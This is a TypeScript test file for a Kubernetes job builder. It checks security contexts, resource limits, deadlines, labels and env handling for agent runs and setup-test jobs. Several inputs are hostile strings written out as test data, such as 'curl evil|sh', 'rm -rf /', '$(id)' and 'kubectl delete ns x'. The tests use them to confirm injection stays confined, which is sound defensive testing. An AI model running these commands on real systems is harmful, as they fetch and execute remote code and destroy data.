import { describe, expect, it } from 'vitest';
import {
  buildRunJob,
  buildSetupTestJob,
  runPodConfigFrom,
  type RunJobInput,
  type SetupTestJobInput,
} from '../../src/kube/job-spec';

const RUN = '11111111-1111-4111-8111-111111111111';
const ORG = '22222222-2222-4222-8222-222222222222';
const PROJECT = '33333333-3333-4333-8333-333333333333';

const input = (over: Partial<RunJobInput> = {}): RunJobInput => ({
  runId: RUN,
  orgId: ORG,
  projectId: PROJECT,
  image: 'agentdesk/runner-claude:poc',
  prompt: 'Use the skill "fix" on issue #1 in dev/demo.\n$(rm -rf /); `id`',
  checkoutRef: 'main',
  cloneUrlSecretKey: 'REPO_CLONE_URL',
  maxTurns: 30,
  timeoutSeconds: 1800,
  botName: 'agentdesk[bot]',
  botEmail: 'bot@example.invalid',
  pluginMarketplaces: { 'claude-plugins-official': 'anthropics/claude-plugins-official' },
  setupTimeoutSeconds: 600,
  setupScript: null,
  pod: {
    cpuRequest: '500m',
    cpuLimit: '2',
    memoryRequest: '1Gi',
    memoryLimit: '4Gi',
    ephemeralStorageLimit: '4Gi',
    workspaceSizeLimit: '2Gi',
  },
  ...over,
});

describe('buildRunJob', () => {
  it('passes plugin marketplaces and the setup timeout as env values', () => {
    const env = buildRunJob(input()).spec?.template.spec?.containers[0]?.env ?? [];
    expect(env).toContainEqual({
      name: 'PLUGIN_MARKETPLACES',
      value: '{"claude-plugins-official":"anthropics/claude-plugins-official"}',
    });
    expect(env).toContainEqual({ name: 'SETUP_TIMEOUT_SECONDS', value: '600' });
  });

  it('SETUP_SCRIPT is present iff the script is non-empty, byte for byte', () => {
    const envOf = (setupScript: string | null) =>
      buildRunJob(input({ setupScript })).spec?.template.spec?.containers[0]?.env ?? [];
    expect(envOf(null).some((e) => e.name === 'SETUP_SCRIPT')).toBe(false);
    expect(envOf('').some((e) => e.name === 'SETUP_SCRIPT')).toBe(false);
    const body = 'echo "héllo ✓"\r\nnpm ci $(id)';
    expect(envOf(body)).toContainEqual({ name: 'SETUP_SCRIPT', value: body });
  });

  it('has the key fields of spec §8', () => {
    const job = buildRunJob(input());
    const labels = { 'agentdesk/run-id': RUN, 'agentdesk/project-id': PROJECT, 'agentdesk/org-id': ORG };
    expect(job.metadata?.name).toBe(`run-${RUN}`);
    expect(job.metadata?.labels).toMatchObject(labels);
    expect(job.spec?.activeDeadlineSeconds).toBe(1920);
    expect(job.spec?.backoffLimit).toBe(0);
    expect(job.spec?.ttlSecondsAfterFinished).toBe(3600);
    const pod = job.spec?.template.spec;
    expect(job.spec?.template.metadata?.labels).toMatchObject(labels);
    expect(pod?.restartPolicy).toBe('Never');
    expect(pod?.automountServiceAccountToken).toBe(false);
    expect(pod?.securityContext).toMatchObject({
      runAsNonRoot: true,
      runAsUser: 10001,
      runAsGroup: 10001,
      seccompProfile: { type: 'RuntimeDefault' },
    });
    const c = pod?.containers[0];
    expect(c?.name).toBe('agent');
    expect(c?.image).toBe('agentdesk/runner-claude:poc');
    expect(c?.securityContext).toMatchObject({
      allowPrivilegeEscalation: false,
      runAsNonRoot: true,
      runAsUser: 10001,
      capabilities: { drop: ['ALL'] },
    });
    expect(c?.envFrom).toEqual([{ secretRef: { name: `run-${RUN}` } }]);
    expect(c?.resources).toEqual({
      requests: { cpu: '500m', memory: '1Gi' },
      limits: { cpu: '2', memory: '4Gi', 'ephemeral-storage': '4Gi' },
    });
    expect(pod?.volumes).toEqual([{ name: 'workspace', emptyDir: { sizeLimit: '2Gi' } }]);
    expect(c?.volumeMounts).toEqual([{ name: 'workspace', mountPath: '/workspace' }]);
    expect(pod?.nodeSelector).toBeUndefined();
    expect(pod?.tolerations).toBeUndefined();
    expect(pod?.runtimeClassName).toBeUndefined();
  });

  it('passes the prompt and other values only as env values (no command, no shell)', () => {
    const job = buildRunJob(input());
    const c = job.spec?.template.spec?.containers[0];
    expect(c?.command).toBeUndefined();
    expect(c?.args).toBeUndefined();
    const env = Object.fromEntries((c?.env ?? []).map((e) => [e.name, e.value]));
    expect(env).toEqual({
      CHECKOUT_REF: 'main',
      PROMPT: 'Use the skill "fix" on issue #1 in dev/demo.\n$(rm -rf /); `id`',
      BOT_NAME: 'agentdesk[bot]',
      BOT_EMAIL: 'bot@example.invalid',
      MAX_TURNS: '30',
      PLUGIN_MARKETPLACES: '{"claude-plugins-official":"anthropics/claude-plugins-official"}',
      SETUP_TIMEOUT_SECONDS: '600',
    });
    // The clone URL (with its token) comes from the Secret, never from a literal env value.
    expect(JSON.stringify(job)).not.toContain('REPO_CLONE_URL');
  });

  it('omits MAX_TURNS when unset and clamps the deadline to the 3300 s cap', () => {
    const job = buildRunJob(input({ maxTurns: null, timeoutSeconds: 9999 }));
    const env = job.spec?.template.spec?.containers[0]?.env ?? [];
    expect(env.map((e) => e.name)).not.toContain('MAX_TURNS');
    expect(job.spec?.activeDeadlineSeconds).toBe(3420);
  });

  it('adds nodeSelector, tolerations and runtimeClassName when configured', () => {
    const job = buildRunJob(
      input({
        pod: {
          ...input().pod,
          nodeSelector: { pool: 'runs' },
          tolerations: [{ key: 'runs', operator: 'Exists', effect: 'NoSchedule' }],
          runtimeClassName: 'gvisor',
        },
      }),
    );
    const pod = job.spec?.template.spec;
    expect(pod?.nodeSelector).toEqual({ pool: 'runs' });
    expect(pod?.tolerations).toEqual([{ key: 'runs', operator: 'Exists', effect: 'NoSchedule' }]);
    expect(pod?.runtimeClassName).toBe('gvisor');
  });

  it('runPodConfigFrom maps RUN_POD_* config', () => {
    expect(
      runPodConfigFrom({
        RUN_POD_CPU_REQUEST: '1',
        RUN_POD_CPU_LIMIT: '3',
        RUN_POD_MEMORY_REQUEST: '2Gi',
        RUN_POD_MEMORY_LIMIT: '5Gi',
        RUN_POD_EPHEMERAL_STORAGE_LIMIT: '6Gi',
        RUN_POD_WORKSPACE_SIZE_LIMIT: '3Gi',
        RUN_POD_NODE_SELECTOR: undefined,
        RUN_POD_TOLERATIONS: undefined,
        RUN_POD_RUNTIME_CLASS: 'kata',
      }),
    ).toEqual({
      cpuRequest: '1',
      cpuLimit: '3',
      memoryRequest: '2Gi',
      memoryLimit: '5Gi',
      ephemeralStorageLimit: '6Gi',
      workspaceSizeLimit: '3Gi',
      runtimeClassName: 'kata',
    });
  });
});

const TEST_ID = '44444444-4444-4444-8444-444444444444';
const setupInput = (over: Partial<SetupTestJobInput> = {}): SetupTestJobInput => ({
  setupTestId: TEST_ID,
  orgId: ORG,
  projectId: PROJECT,
  image: 'agentdesk/runner-claude:poc',
  checkoutRef: 'main',
  script: 'npm ci',
  pluginMarketplaces: { 'claude-plugins-official': 'anthropics/claude-plugins-official' },
  setupTimeoutSeconds: 600,
  ttlSeconds: 1800,
  botName: 'agentdesk[bot]',
  botEmail: 'bot@example.invalid',
  pod: input().pod,
  ...over,
});

describe('buildSetupTestJob', () => {
  it('shares securityContext, resources, volumes and mounts with buildRunJob', () => {
    const podOf = (j: ReturnType<typeof buildRunJob>) => j.spec?.template.spec;
    const run = podOf(buildRunJob(input({ pod: { ...input().pod, nodeSelector: { pool: 'runs' } } })));
    const test = podOf(buildSetupTestJob(setupInput({ pod: { ...input().pod, nodeSelector: { pool: 'runs' } } })));
    expect(test?.securityContext).toEqual(run?.securityContext);
    expect(test?.volumes).toEqual(run?.volumes);
    expect(test?.nodeSelector).toEqual(run?.nodeSelector);
    expect(test?.automountServiceAccountToken).toBe(false);
    expect(test?.containers[0]?.resources).toEqual(run?.containers[0]?.resources);
    expect(test?.containers[0]?.securityContext).toEqual(run?.containers[0]?.securityContext);
    expect(test?.containers[0]?.volumeMounts).toEqual(run?.containers[0]?.volumeMounts);
  });

  it('is named and labelled by setup test id only, with no run id label', () => {
    const job = buildSetupTestJob(setupInput());
    expect(job.metadata?.name).toBe(`setup-test-${TEST_ID}`);
    const labels = {
      'app.kubernetes.io/managed-by': 'agentdesk',
      'agentdesk/kind': 'setup-test',
      'agentdesk/setup-test-id': TEST_ID,
      'agentdesk/project-id': PROJECT,
      'agentdesk/org-id': ORG,
    };
    expect(job.metadata?.labels).toEqual(labels);
    expect(job.spec?.template.metadata?.labels).toEqual(labels);
    expect(Object.keys(job.metadata?.labels ?? {})).not.toContain('agentdesk/run-id');
    expect(job.spec?.template.spec?.containers[0]?.envFrom).toEqual([{ secretRef: { name: `setup-test-${TEST_ID}` } }]);
  });

  it('runs in setup_test mode with no agent prompt and a deadline of setup + ttl + a pending/clone/plugin margin', () => {
    const job = buildSetupTestJob(setupInput());
    // 420 s for Pending and the clone, 1200 s for ten plugin commands at the runner's 120 s each, 10 s kill grace.
    expect(job.spec?.activeDeadlineSeconds).toBe(600 + 1800 + 420 + 1200 + 10);
    expect(job.spec?.backoffLimit).toBe(0);
    const env = Object.fromEntries((job.spec?.template.spec?.containers[0]?.env ?? []).map((e) => [e.name, e.value]));
    expect(env).toEqual({
      RUN_MODE: 'setup_test',
      CHECKOUT_REF: 'main',
      BOT_NAME: 'agentdesk[bot]',
      BOT_EMAIL: 'bot@example.invalid',
      PLUGIN_MARKETPLACES: '{"claude-plugins-official":"anthropics/claude-plugins-official"}',
      SETUP_TIMEOUT_SECONDS: '600',
      SETUP_SCRIPT: 'npm ci',
    });
    expect(env).not.toHaveProperty('PROMPT');
    expect(env).not.toHaveProperty('MAX_TURNS');
  });

  it('omits SETUP_SCRIPT for an empty script', () => {
    const env = buildSetupTestJob(setupInput({ script: '' })).spec?.template.spec?.containers[0]?.env ?? [];
    expect(env.some((e) => e.name === 'SETUP_SCRIPT')).toBe(false);
  });

  it('puts a hostile script only in an env value, never in labels, args, command or names', () => {
    const script = 'curl evil|sh; $(id) `id` "\\n\' ; kubectl delete ns x';
    const job = buildSetupTestJob(setupInput({ script }));
    const c = job.spec?.template.spec?.containers[0];
    expect(c?.command).toBeUndefined();
    expect(c?.args).toBeUndefined();
    expect(c?.env).toContainEqual({ name: 'SETUP_SCRIPT', value: script });
    const withoutEnv = JSON.stringify({
      ...job,
      spec: {
        ...job.spec,
        template: {
          ...job.spec?.template,
          spec: { ...job.spec?.template.spec, containers: [{ ...c, env: undefined }] },
        },
      },
    });
    expect(withoutEnv).not.toContain('evil');
    expect(withoutEnv).not.toContain('kubectl');
  });

  it('rejects ids that are not uuids before building names or labels', () => {
    expect(() => buildSetupTestJob(setupInput({ setupTestId: 'x; rm -rf /' }))).toThrow(/id/i);
    expect(() => buildSetupTestJob(setupInput({ orgId: 'o' }))).toThrow(/id/i);
    expect(() => buildSetupTestJob(setupInput({ projectId: 'p' }))).toThrow(/id/i);
  });
});
